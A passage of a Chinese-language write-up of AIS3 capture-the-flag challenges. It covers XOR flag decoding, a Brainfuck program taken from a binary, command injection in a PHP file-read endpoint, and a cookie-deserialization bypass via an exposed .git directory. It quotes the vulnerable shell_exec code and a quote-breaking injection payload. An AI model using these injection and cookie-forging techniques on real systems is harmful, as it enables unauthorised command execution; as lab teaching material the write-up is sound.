<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> in;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.size(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> length = i % flag.size();</span><br><span class="line">        flag[length] = v[i] ^ flag[length];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i &lt; flag.size(); i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Stand-up-Brain"><a href="#Stand-up-Brain" class="headerlink" title="Stand up! Brain"></a>Stand up! Brain</h3><p><img src="https://i.imgur.com/RbFHjZk.png" alt=""></p>
<p>這題要輸入一個字串，然後底下的邏輯長得就像一個 <a href="https://zh.wikipedia.org/zh-tw/Brainfuck" target="_blank" rel="noopener">brainfuck</a> 的 interpreter<br>去 <code>.rodata</code> 找到該 bf code：</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span>&gt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span><span class="title">]</span>&gt;<span class="title">[</span>&gt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span>&gt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span><span class="title">]</span>&gt;<span class="title">[</span>&gt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span>&gt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span><span class="title">]</span>&gt;<span class="title">[</span>&gt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span>&gt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span><span class="title">]</span>&gt;<span class="title">[</span>&gt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span>&gt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span><span class="title">]</span>&gt;<span class="title">[</span>&gt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span>&gt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span><span class="title">]</span>&gt;<span class="title">[</span>&gt;&gt;--<span class="literal">-</span><span class="literal">-</span><span class="title">[</span>--<span class="literal">-</span><span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;++<span class="string">.</span>++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="title">[</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span><span class="literal">+</span><span class="title">[</span>--<span class="literal">-</span>&gt;++&lt;<span class="title">]</span>&gt;++<span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="title">[</span>--<span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span><span class="string">.</span><span class="title">[</span>--<span class="literal">-</span><span class="literal">-</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span><span class="string">.</span><span class="title">[</span>--&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;--<span class="literal">-</span><span class="string">.</span><span class="title">[</span>--<span class="literal">-</span>&gt;++&lt;<span class="title">]</span>&gt;--<span class="literal">-</span><span class="string">.</span>++<span class="title">[</span><span class="literal">-</span>&gt;++<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span><span class="literal">+</span><span class="title">[</span>--&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="literal">+</span><span class="string">.</span><span class="title">[</span>--<span class="literal">-</span>&gt;++&lt;<span class="title">]</span>&gt;--<span class="literal">-</span><span class="string">.</span>++<span class="title">[</span><span class="literal">-</span>&gt;++<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span>++<span class="literal">+</span><span class="string">.</span><span class="title">[</span>--<span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;--<span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="title">[</span>--&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="title">[</span><span class="literal">-</span>&gt;++&lt;<span class="title">]</span>&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="title">[</span>--<span class="literal">-</span><span class="literal">-</span>&gt;++<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="title">[</span>--<span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span><span class="literal">-</span><span class="title">[</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span><span class="string">.</span>++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>--<span class="title">[</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&gt;++<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span>++<span class="literal">+</span><span class="string">.</span><span class="title">[</span>--<span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="title">[</span>--&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;--<span class="literal">-</span><span class="string">.</span>++<span class="title">[</span>--<span class="literal">-</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span>++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>++<span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span><span class="title">[</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;++<span class="string">.</span>&gt;<span class="literal">-</span><span class="title">[</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span>--<span class="literal">-</span><span class="title">[</span><span class="literal">-</span>&gt;++&lt;<span class="title">]</span>&gt;<span class="literal">-</span><span class="string">.</span>++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="title">[</span>--<span class="literal">-</span>&gt;<span class="literal">+</span>&lt;<span class="title">]</span>&gt;++<span class="literal">+</span><span class="string">.</span>++<span class="literal">+</span><span class="string">.</span><span class="title">[</span><span class="literal">-</span><span class="title">]</span><span class="title">]</span><span class="title">]</span><span class="title">]</span><span class="title">]</span><span class="title">]</span><span class="title">]</span></span><br></pre></td></tr></table></figure>
<p>上面的 brainfuck 如果用正常的 brainfuck interpreter 應該會是無窮迴圈，但在 google 通靈之下，找到一個迴圈爛掉的 brainfuck 實作就印出 flag ㄌ</p>
<p><a href="https://ideone.com/AHnvP0" target="_blank" rel="noopener">https://ideone.com/AHnvP0</a></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Squirrel"><a href="#Squirrel" class="headerlink" title="Squirrel"></a>Squirrel</h3><p><a href="https://squirrel.ais3.org/" target="_blank" rel="noopener">https://squirrel.ais3.org/</a></p>
<p>打開網頁發現有很多松鼠，很符合題目的名字www<br><img src="https://i.imgur.com/sDa5qRD.png" alt=""></p>
<p>檢視網頁原始碼後發現 <code>api.php</code> 的個 endpoint，看起來有 LFI</p>
<p><img src="https://i.imgur.com/ld7uI7P.png" alt=""></p>
<p>可以用 <code>api.php?get=path</code> 讀出 <code>api.php</code> 的原始碼，可以發現 <code>$output</code> 存在 command injection<br>可以用 <code>&#39;; command ;&#39;</code> 執行任意指令</p>
<p><img src="https://i.imgur.com/VLKXlvo.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: application/json'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($file = @$_GET[<span class="string">'get'</span>]) &#123;</span><br><span class="line">    $output = shell_exec(<span class="string">"cat '$file'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($output !== <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode([</span><br><span class="line">            <span class="string">'output'</span> =&gt; $output</span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode([</span><br><span class="line">            <span class="string">'error'</span> =&gt; <span class="string">'cannot get file'</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> json_encode([</span><br><span class="line">        <span class="string">'error'</span> =&gt; <span class="string">'empty file path'</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以在根目錄找到 <code>5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code> 讀出來就是 flag</p>
<p><img src="https://i.imgur.com/LM4TrQe.png" alt=""></p>
<p><img src="https://i.imgur.com/uZtX7ZT.png" alt=""></p>
<ul>
<li>題外話<ul>
<li>postman 可以直接 import curl 的指令</li>
</ul>
</li>
</ul>
<p><img src="https://i.imgur.com/jIs3Ymy.png" alt=""><br><img src="https://i.imgur.com/d3aUi1x.png" alt=""><br><img src="https://i.imgur.com/5eaRDT7.png" alt=""></p>
<h3 id="Elephant"><a href="#Elephant" class="headerlink" title="Elephant"></a>Elephant</h3><p>這題一開始畫面有個輸入框，隨意輸入後可以發現上頭有個隱藏的小字</p>
<p><img src="https://i.imgur.com/gx0iefC.png" alt=""></p>
<p>嘗試了一些常見的目錄後可以發現存在 <code>.git</code> 目錄，並且可以讀取目錄內的檔案</p>
<p><img src="https://i.imgur.com/SNOoMOL.png" alt=""><br><img src="https://i.imgur.com/O4Bzp2Y.png" alt=""></p>
<p>可以使用<a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener">工具</a>把 git repo 載下來，可以看到<a href="https://pastebin.com/mdcmDSLM" target="_blank" rel="noopener">原始碼</a></p>
<p>瀏覽一下原始碼後發現，它會把輸入的名稱用來建構 <code>User</code> 然後序列化後再 base64 放在 cookie 裏</p>
<p><img src="https://i.imgur.com/rZYIs5V.png" alt=""></p>
<p>如果 <code>$user-&gt;canReadFlag()</code> 是 true 的話會印出 flag</p>
<p><img src="https://i.imgur.com/aaT62hT.png" alt=""></p>
<p>而 <code>User</code> 要在 <code>strcmp($flag, $this-&gt;token) == 0</code> 時才是 true</p>
<p><img src="https://i.imgur.com/SYt0hOT.png" alt=""></p>
<p>想法：<code>strcmp()</code> 再與空物件比較會是 == 0，<a href="http://sandbox.onlinephpfunctions.com/code/d475b9eb264f535e8e722069732bcab198d452cb" target="_blank" rel="noopener">Example</a><br>所以可以把 <code>token</code> 變成是空物件，這樣就可以通過 <code>canReadFlag()</code> 了</p>
